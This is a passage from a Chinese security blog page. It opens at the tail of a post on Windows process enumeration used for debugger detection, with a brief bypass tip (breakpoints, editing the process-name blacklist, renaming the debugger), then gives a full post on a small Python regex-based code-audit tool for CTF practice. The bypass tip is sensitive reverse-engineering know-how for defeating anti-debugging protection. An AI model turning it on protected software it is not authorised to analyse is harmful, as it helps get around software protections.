<pre><code>函数往一个数组传入当前所有PID．然后遍历这个数组就可以遍历整个进程列表了
</code></pre><ul>
<li><p>EnumProcessModules<br>获取某进程里所有模块的句柄<br><a href="https://msdn.microsoft.com/zh-cn/ms682631\(v=vs.85\" target="_blank" rel="noopener">MSDN-EnumProcessModule</a>.aspx) </p>
<pre><code>函数往一个数组里放入某个进程所有模块的句柄．
</code></pre></li>
<li><p>GetModuleBaseName<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683196\(v=vs.85\" target="_blank" rel="noopener">MSDN-GetModuleBaseName</a>.aspx)<br>获得指定模块的名称，在Win32环境下，模块和进程可以混同．</p>
</li>
</ul>
<pre><code>函数向指定的缓冲区写入模块的名称．
</code></pre><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682623\(v=vs.85\" target="_blank" rel="noopener">MSDN-EnumProcesses &amp; EnumProcessModule &amp; GetModuleBaseName 枚举所有进程</a>.aspx) </p>
<p>此外，个人用这种方式来实现遍历进程，涉及的API： CreateToolhelp32Snapshot<br><a href="https://msdn.microsoft.com/zh-cn/library/ms686852\(v=vs.85\" target="_blank" rel="noopener">MSDN-拍摄进程快照，再遍历进程</a>.aspx) </p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在涉及的函数上下断点分析，修改程序内建的进程名黑名单，或者修改调试器的名称皆可．</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/" class="post-title-link" itemprop="url">150行代码写成的可扩展的代码审计辅助工具</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-08 19:18:51 / Geändert am: 19:20:38" itemprop="dateCreated datePublished" datetime="2018-02-08T19:18:51+08:00">2018-02-08</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>你是否觉得有时候人类的思考模式很像正则匹配？
</code></pre><h4 id="本文包括以下几个部分："><a href="#本文包括以下几个部分：" class="headerlink" title="本文包括以下几个部分："></a>本文包括以下几个部分：</h4><pre><code>为什么我觉得可以用这个工具（个人认为）
我为什么写这个工具
工具的实现思路
工具的升级思路
源代码的github地址
使用测试
最后说两句
</code></pre><h4 id="为什么我觉得可以用这个工具（个人认为）"><a href="#为什么我觉得可以用这个工具（个人认为）" class="headerlink" title="为什么我觉得可以用这个工具（个人认为）"></a>为什么我觉得可以用这个工具（个人认为）</h4><pre><code>通过审计源代码，也就是查看源代码，来发现其中存在的隐患，代码审计需要对被审计的语言有充分的了解，不仅是能读懂源代码，还要了解语言本身的缺陷。很多时候代码审计的突破口就在于一些已经广为人知的有问题的代码的写法。如果能够快速找到突破口，也就提高了审计的效率。
</code></pre><h4 id="我为什么写这个工具"><a href="#我为什么写这个工具" class="headerlink" title="我为什么写这个工具"></a>我为什么写这个工具</h4><pre><code>我是一个ctf小白，为了考pte，正在学习怎么做ctf题目（个人比较感兴趣代码审计的题目，别的没啥什么感觉）。学习知识肯定是要笔记的，但是我觉得那种传统的笔记效果不是太好，记下来了也不一定记住了，到时候遇上题目万一想不起来，多尴尬。这时我忽然想到，我让程序记住就好了，它不会背叛我，一定会忠实地对我表达他的所见所想。所以我只要让程序看到某个字眼，就来提示我一下，并且告诉我，我把笔记记在了什么地方不就行了。
</code></pre><h4 id="工具的实现思路"><a href="#工具的实现思路" class="headerlink" title="工具的实现思路"></a>工具的实现思路</h4><pre><code>程序入口：adcode.py
主程序：ADC/ADCode.py
插件目录：rules
笔记目录（可选）：note
</code></pre><p><img src="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/adcode1.jpg" alt=""></p>
<h5 id="1-读取目标代码"><a href="#1-读取目标代码" class="headerlink" title="1.读取目标代码"></a>1.读取目标代码</h5><pre><code>联想平时的应用，我觉得应该让工具从剪贴板内读取待审计的代码，这样使用比较方便。但是，偶尔也会遇到待审计的代码是一个php文件的场景。所以我决定支持两种读取方式，一种是从剪贴板读取，一种是从文件读取。
</code></pre><p>剪贴板读取，为了能够跨平台，这里需要用到一个python的库——pyperclip。<br>这是一个第三方的跨平台的python访问剪贴板的库。<br>进入python shell看一下最基本的使用例子。</p>
<p><img src="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/1.png" alt=""></p>
<p>知道了这个库的使用，只需在代码中用其paste()方法，即可获取剪贴板的内容了。<br>从文件获取比较简单，直接用python的open()就好了。</p>
<h5 id="2-运行主程序"><a href="#2-运行主程序" class="headerlink" title="2.运行主程序"></a>2.运行主程序</h5><pre><code>让入口脚本调用主程序，把读取到的代码和插件的内容传递过去。
</code></pre><h5 id="3-加载插件"><a href="#3-加载插件" class="headerlink" title="3.加载插件"></a>3.加载插件</h5><pre><code>主程序加载插件，借助BeautifulSoup来解析插件内容。
插件有三种类型：
    1.vulnfunc 只要发现在程序中使用了某函数，则程序认为存在风险。
    2.regmatchall 根据插件给出的一条或者多条正则表达式，只有给出的正则全部能够匹配，才认为存在风险。
    3.regmatchonce 给出的一条或者多条正则表达式，只要有一条可以匹配，就认为存在风险。
    4.keywords 只要在代码中发现了关键词就认为有风险，简单粗暴。
</code></pre><h5 id="4-返回结果"><a href="#4-返回结果" class="headerlink" title="4.返回结果"></a>4.返回结果</h5><pre><code>根据插件的指示来分析代码，并且返回结果。
</code></pre><h5 id="5-格式化输出"><a href="#5-格式化输出" class="headerlink" title="5.格式化输出"></a>5.格式化输出</h5><pre><code>比较好看的把提示输出出来．
</code></pre><h4 id="工具的升级思路"><a href="#工具的升级思路" class="headerlink" title="工具的升级思路"></a>工具的升级思路</h4><pre><code>如果要审计大量的代码，则加入多线程机制，每个线程是一个插件，遍历指定的文件夹，挨个审计即可．
</code></pre><h4 id="源代码的github地址（我添加了尽量详尽的注释）"><a href="#源代码的github地址（我添加了尽量详尽的注释）" class="headerlink" title="源代码的github地址（我添加了尽量详尽的注释）"></a>源代码的github地址（我添加了尽量详尽的注释）</h4><pre><code>https://github.com/hl0rey/ADCode
</code></pre><h4 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h4><p>用这个地址的题目来测试，这些题目我觉得很典型很不错．<br><a href="https://github.com/bowu678/php_bugs" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs</a></p>
<p>复制这个题目到剪贴板<br><img src="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/2.png" alt=""></p>
<p>直接运行脚本<br><img src="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/3.png" alt=""></p>
<p>输出内容如下<br><img src="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/4.png" alt=""></p>
<h4 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h4><p>１．我不知道这能不能算个代码审计工具，我姑且这么叫它，请各位大神轻喷．<br>２．这个工具的功能强大与否在于插件写的怎么样，是不是准确的把代码的问题用正则概括出来是关键．<br>３．希望能起到抛砖引玉的作用，分享思路．<br>４．也希望刚学习ｐｙｔｈｏｎ的新手，根据这篇文档和代码的注释能够学到东西．<br>５．一切尽在代码中．</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Inhaltsverzeichnis
        </li>
        <li class="sidebar-nav-overview">
          Übersicht
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">hl0rey</p>
  <div class="site-description" itemprop="description"></div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
          
            <a href="/categories/">
          
        
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">Kategorien</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">schlagwörter</span>
        </a>
      </div>
    
  </nav>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hl0rey</span>
</div>
  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.5.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/muse.js?v=7.4.0"></script>
<script src="/js/next-boot.js?v=7.4.0"></script>



  





















  

  

  

</body>
</html>
